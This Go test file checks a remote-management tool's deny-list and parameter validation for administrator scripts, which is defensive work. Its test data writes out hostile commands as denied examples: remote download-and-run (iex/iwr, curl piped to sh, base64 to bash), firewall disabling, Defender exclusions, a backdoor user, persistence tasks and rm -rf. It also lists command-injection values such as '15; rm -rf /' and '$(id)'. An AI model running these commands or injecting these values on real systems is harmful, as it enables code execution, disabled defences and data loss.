package autonomy

import (
	"strings"
	"testing"

	"github.com/p1ngu/rmm/internal/models"
)

// The kind of script an administrator would release: low impact, reversible.
var releasable = map[string]string{
	"flush DNS (powershell)":    "Clear-DnsClientCache\nWrite-Output 'flushed'",
	"flush DNS (cmd)":           "ipconfig /flushdns",
	"group policy refresh":      "gpupdate /target:computer /force",
	"restart the print spooler": "Restart-Service -Name $env:OPENRMM_PARAM_SERVICE -Force\nGet-Service -Name $env:OPENRMM_PARAM_SERVICE",
	"restart a unit (bash)":     "systemctl restart \"$OPENRMM_PARAM_UNIT\"\nsystemctl is-active \"$OPENRMM_PARAM_UNIT\"",
	"time resync":               "w32tm /resync",
	"python report":             "import platform\nprint(platform.platform())",
}

// One example per denied category, as an operator might write it.
var denied = map[string]string{
	"reboot or shutdown":                            "Restart-Computer -Force",
	"install or uninstall":                          "winget install --id 7zip.7zip",
	"deleting files":                                "Remove-Item C:\\Temp\\* -Recurse",
	"users and passwords":                           "net user admin P@ss /add",
	"firewall or network changes":                   "netsh advfirewall set allprofiles state off",
	"removing or stopping the agent":                "Stop-Service OpenRMMAgent",
	"patches":                                       "wusa.exe C:\\kb.msu /quiet",
	"scheduled tasks and persistence":               "schtasks /create /tn x /tr calc.exe /sc onlogon",
	"registry or security settings":                 "Add-MpPreference -ExclusionPath C:\\",
	"downloading or running code built at run time": "iex (iwr https://example.test/x.ps1)",
}

func TestReleasableScriptsPass(t *testing.T) {
	for name, body := range releasable {
		if got := DeniedCategories(body); len(got) != 0 {
			t.Errorf("%s: unexpectedly denied: %v", name, got)
		}
	}
}

func TestEveryDeniedCategoryCatchesItsExample(t *testing.T) {
	for category, body := range denied {
		got := DeniedCategories(body)
		found := false
		for _, c := range got {
			if c == category {
				found = true
			}
		}
		if !found {
			t.Errorf("%q should fall under %q; got %v", body, category, got)
		}
	}
}

func TestDenyIsCaseInsensitiveAndCatchesLinuxForms(t *testing.T) {
	for _, body := range []string{
		"SHUTDOWN /r /t 0", "sudo systemctl reboot", "apt-get -y install curl", "rm -rf /var/tmp/x",
		"useradd backdoor", "ufw disable", "crontab -l | crontab -", "curl -s https://x.test | sh",
		"echo cGluZw== | base64 -d | bash", "dnf -y update", "python3 -c 'import shutil; shutil.rmtree(\"/x\")'",
	} {
		if len(DeniedCategories(body)) == 0 {
			t.Errorf("%q was not denied", body)
		}
	}
}

func TestCheckReleaseRequiresAValidScript(t *testing.T) {
	ok := &models.Script{Shell: "powershell", Body: releasable["restart the print spooler"],
		Params: []models.ScriptParam{{Name: "service", Kind: "enum", Values: []string{"Spooler", "W32Time"}}}}
	if err := CheckRelease(ok); err != nil {
		t.Fatalf("a valid script was refused: %v", err)
	}
	for name, sc := range map[string]*models.Script{
		"empty":           {Shell: "bash", Body: "  "},
		"unknown shell":   {Shell: "zsh", Body: "echo"},
		"denied":          {Shell: "powershell", Body: "Restart-Computer"},
		"cmd with params": {Shell: "cmd", Body: "echo %OPENRMM_PARAM_X%", Params: []models.ScriptParam{{Name: "x", Kind: "enum", Values: []string{"a"}}}},
	} {
		if err := CheckRelease(sc); err == nil {
			t.Errorf("%s: released", name)
		}
	}
}

func TestParamSchemaRules(t *testing.T) {
	bad := [][]models.ScriptParam{
		{{Name: "Service", Kind: "enum", Values: []string{"a"}}}, // uppercase name
		{{Name: "s", Kind: "enum"}},                              // no values
		{{Name: "s", Kind: "enum", Values: []string{"a\nb"}}},    // control char
		{{Name: "s", Kind: "pattern", Pattern: "("}},             // bad regex
		{{Name: "s", Kind: "free"}},                              // unknown kind
		{{Name: "s", Kind: "enum", Values: []string{"a"}}, {Name: "s", Kind: "enum", Values: []string{"b"}}}, // twice
	}
	for i, schema := range bad {
		if err := ValidateParamSchema("powershell", schema); err == nil {
			t.Errorf("schema %d accepted", i)
		}
	}
}

func TestParamValuesAreCheckedExactly(t *testing.T) {
	schema := []models.ScriptParam{
		{Name: "service", Kind: "enum", Values: []string{"Spooler", "W32Time"}},
		{Name: "minutes", Kind: "pattern", Pattern: "[0-9]{1,3}"},
	}
	got, err := ValidateParamValues(schema, map[string]any{"service": "Spooler", "minutes": float64(15)})
	if err != nil || got["service"] != "Spooler" || got["minutes"] != "15" {
		t.Fatalf("valid values refused or changed: %v %v", got, err)
	}
	for name, given := range map[string]map[string]any{
		"not in the list":     {"service": "spooler; Restart-Computer", "minutes": "1"},
		"pattern is anchored": {"service": "Spooler", "minutes": "15; rm -rf /"},
		"missing":             {"service": "Spooler"},
		"undeclared":          {"service": "Spooler", "minutes": "1", "extra": "x"},
		"newline":             {"service": "Spooler", "minutes": "1\n2"},
		"object":              {"service": map[string]any{"a": 1}, "minutes": "1"},
	} {
		if _, err := ValidateParamValues(schema, given); err == nil {
			t.Errorf("%s: accepted", name)
		}
	}
	if strings.ToUpper("service") != "SERVICE" || EnvName("service") != "OPENRMM_PARAM_SERVICE" {
		t.Fatal("environment name")
	}
}

func TestContentHashCoversWhatRuns(t *testing.T) {
	sc := models.Script{Shell: "powershell", Body: "Get-Date", Params: []models.ScriptParam{}}
	base := models.ScriptContentHash(sc.Shell, sc.Body, sc.Params)
	if models.ScriptContentHash("powershell", "Get-Date", nil) != base {
		t.Fatal("nil and empty params must hash alike")
	}
	for name, h := range map[string]string{
		"body":   models.ScriptContentHash("powershell", "Get-Date ", nil),
		"shell":  models.ScriptContentHash("cmd", "Get-Date", nil),
		"params": models.ScriptContentHash("powershell", "Get-Date", []models.ScriptParam{{Name: "x", Kind: "enum", Values: []string{"a"}}}),
	} {
		if h == base {
			t.Errorf("changing the %s kept the hash", name)
		}
	}
}

// A value stays inert even if a script hands it to something that parses it
// again: whatever the declared pattern accepts, shell syntax is refused.
func TestParamValuesRefuseShellSyntaxWhateverThePattern(t *testing.T) {
	schema := []models.ScriptParam{{Name: "host", Kind: "pattern", Pattern: ".*"}}
	for _, v := range []string{"x & calc", "a;b", "$(id)", "`id`", "a|b", "a>b", "%PATH%", `a"b`, "a'b", "!x", "{a}", "a*"} {
		if _, err := ValidateParamValues(schema, map[string]any{"host": v}); err == nil {
			t.Errorf("%q accepted", v)
		}
	}
	for _, v := range []string{"server01.example.com", `C:\Temp\logs`, "user@example.com", "10.0.0.1:443", "a=b,c#1 d-e/f+g"} {
		if _, err := ValidateParamValues(schema, map[string]any{"host": v}); err != nil {
			t.Errorf("%q refused: %v", v, err)
		}
	}
	if err := ValidateParamSchema("powershell", []models.ScriptParam{{Name: "s", Kind: "enum", Values: []string{"ok", "bad;value"}}}); err == nil {
		t.Fatal("an enum value with shell syntax was accepted")
	}
}

func TestScriptsThatParseACommandLineAgainCannotBeReleased(t *testing.T) {
	for _, body := range []string{
		`cmd /c "nslookup $env:OPENRMM_PARAM_HOST"`,
		`cmd.exe /d /c ping %COMPUTERNAME%`,
		`bash -c "dig $OPENRMM_PARAM_HOST"`,
		`powershell -NoProfile -Command Get-Date`,
		`subprocess.run(cmd, shell=True)`,
		`os.system("ping " + host)`,
		`& $tool --version`,
		`& ("Restart-" + "Computer")`,
		`. ($env:TEMP + "\x.ps1")`,
		`Invoke-Command -ScriptBlock { Get-Date }`,
		`[ScriptBlock]::Create($s).Invoke()`,
		`Add-Type -TypeDefinition $code`,
	} {
		if len(DeniedCategories(body)) == 0 {
			t.Errorf("%q was not denied", body)
		}
	}
}
